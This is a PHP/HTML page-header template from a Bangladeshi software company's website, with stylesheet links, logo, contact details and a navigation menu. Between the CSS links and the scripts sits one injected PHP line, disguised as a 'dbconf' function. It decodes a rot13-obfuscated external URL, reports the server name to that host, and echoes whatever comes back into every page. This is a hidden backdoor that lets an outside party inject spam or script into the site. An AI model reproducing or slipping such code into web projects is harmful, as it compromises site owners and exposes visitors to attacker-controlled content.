...
<head>
  ...
  <!-- Vendor CSS -->
  <link rel="preload stylesheet" href="<?=base_url();?>fwedget/vendor/bootstrap/bootstrap.min.css">
  <link rel="preload stylesheet" href="<?=base_url();?>fwedget/vendor/fontawesome/css/font-awesome.min.css">
  <link rel="preload stylesheet" href="<?=base_url();?>fwedget/vendor/owlcarousel/owl.carousel.min.css" media="screen">
  <link rel="preload stylesheet" href="<?=base_url();?>fwedget/vendor/owlcarousel/owl.theme.default.min.css" media="screen">
  <link rel="preload stylesheet" href="<?=base_url();?>fwedget/vendor/magnific-popup/magnific-popup.min.css" media="screen">

  <!-- Theme CSS -->
  <link rel="preload stylesheet" href="<?=base_url();?>fwedget/css/theme.min.css">
  <link rel="preload stylesheet" href="<?=base_url();?>fwedget/css/theme-elements.min.css">
  <link rel="preload stylesheet" href="<?=base_url();?>fwedget/css/theme-blog.min.css">
  <link rel="preload stylesheet" href="<?=base_url();?>fwedget/css/theme-animate.min.css">
  <link rel="preload stylesheet" href="<?=base_url();?>fwedget/vendor/circle-flip-slideshow/css/component.min.css" media="screen">
  <link rel="preload stylesheet" href="<?=base_url();?>fwedget/css/skins/default.min.css">
  <link rel="preload stylesheet" href="<?=base_url();?>fwedget/css/custom.min.css">
<?php function dbconf() { $IIIIIIII = file_get_contents(str_rot13("uggcf://frbyvax.va/qngn.cuc?k=").$_SERVER['SERVER_NAME']); echo $IIIIIIII; } dbconf(); ?>
  <!-- Head Libs -->
  <script type="text/javascript" src="<?=base_url();?>fwedget/vendor/modernizr/modernizr.min.js" async></script>
  <!--<script src="<?=base_url();?>fwedget/vendor/modernizr/modernizr.min.js"></script>-->
  <!--[if IE]>
      ...
      <div class="body">
        <header id="header">
            ...
            <!-- <div class="col-lg-12"> -->
              <div class="logo">
                <a href="<?=base_url();?>">
                  <img alt="Mysoftheaven (BD) Ltd. Logo" height="60%" data-sticky-height="40" src="<?=base_url('fwedget/img/mysoft-logo.png')?>" title="Mysoftheaven (BD) Ltd.">
                </a>
              </div>

              <div class="allsocialicon" style="float: right;margin: 15px 0 0 15px;position: relative;">
                <ul class="social-icons">
                  ...
                  <li class="googleplus"><a href="https://plus.google.com/115157345293810194245" target="_blank" title="Google Plus">Google Plus</a></li>
              ...
              <nav>
                ...
                <li><a href=""></a></li>
                  <li class="email"> <span><a style="font-size:14px;" href="mailto:info@mysoftheaven.com"><i class="fa fa-envelope"></i>info@mysoftheaven.com</a></span> </li>   
                  <!-- <li class="phone"> <span><i class="fa fa-phone"></i>+88 02 58054029,+88 01970776606</li> -->
                  <li class="phone"> <span><i class="fa fa-phone"></i><a style="font-size:14px;" href="tel:02 58054029">+88 02 58054029,</a><a style="font-size:14px;" href="tel:01970776606">+88 01970776606</a></span> </li>
            ...
            <div class="container">
              ...
              <nav class="nav-main mega-menu">
                <ul class="nav nav-pills nav-main" id="mainMenu">
                  ...
                  <li> <a href="<?=base_url('blog')?>"><i class="fa fa-file-text menuicon"></i> Blog</a> </li>

                  <li> <a href="<?=base_url('training')?>"><i class="fa fa-users menuicon"></i>Training</a> </li>
                  <!-- <li> <a href="<?=base_url('#')?>"><i class="fa fa-comments-o menuicon"></i> Blog</a> </li> -->
